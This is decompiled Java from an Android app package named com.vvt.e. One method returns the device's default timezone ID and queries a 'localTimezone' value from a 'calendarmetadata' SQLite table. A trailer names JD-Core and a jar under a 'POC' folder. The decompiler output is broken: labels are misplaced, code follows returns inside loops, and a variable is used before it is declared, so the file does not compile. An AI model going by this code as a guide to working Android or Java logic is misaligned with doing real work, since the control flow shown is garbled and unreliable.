package com.vvt.e;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import java.util.TimeZone;

public class b
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  
  public static String a()
  {
    boolean bool1 = false;
    Object localObject1 = null;
    Object localObject2 = TimeZone.getDefault().getID();
    SQLiteDatabase localSQLiteDatabase = a.b();
    boolean bool3;
    if (localSQLiteDatabase != null)
    {
      bool3 = localSQLiteDatabase.isDbLockedByCurrentThread();
      if (!bool3)
      {
        bool3 = localSQLiteDatabase.isDbLockedByOtherThreads();
        if (!bool3) {
          break label59;
        }
      }
    }
    bool1 = a;
    if ((!bool1) || (localSQLiteDatabase != null)) {
      localSQLiteDatabase.close();
    }
    label59:
    boolean bool2;
    for (;;)
    {
      return (String)localObject2;
      Object localObject3 = "SELECT %s FROM %s";
      int j = 2;
      try
      {
        Object[] arrayOfObject = new Object[j];
        int k = 0;
        String str = "localTimezone";
        arrayOfObject[0] = str;
        k = 1;
        str = "calendarmetadata";
        arrayOfObject[k] = str;
        localObject3 = String.format((String)localObject3, arrayOfObject);
        j = 0;
        arrayOfObject = null;
        localObject1 = localSQLiteDatabase.rawQuery((String)localObject3, null);
        localObject3 = localObject1;
      }
      catch (SQLiteException localSQLiteException)
      {
        for (;;)
        {
          int i;
          bool3 = b;
          if (bool3) {}
          bool3 = false;
          localObject4 = null;
        }
        bool2 = ((Cursor)localObject4).moveToNext();
        if (!bool2) {
          break label224;
        }
        localObject1 = ((Cursor)localObject4).getString(0);
        if (localObject1 != null) {
          break label254;
        }
        bool2 = a;
        if (!bool2) {
          break label224;
        }
      }
      if (localObject3 != null)
      {
        i = ((Cursor)localObject3).getCount();
        if (i != 0) {
          break label191;
        }
      }
      bool2 = a;
      if ((!bool2) || (localObject3 != null)) {
        ((Cursor)localObject3).close();
      }
      localSQLiteDatabase.close();
    }
    for (;;)
    {
      Object localObject4;
      label191:
      label224:
      ((Cursor)localObject4).close();
      localSQLiteDatabase.close();
      bool2 = a;
      if (bool2) {}
      bool2 = a;
      if (!bool2) {
        break;
      }
      break;
      label254:
      localObject2 = localObject1;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/e/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */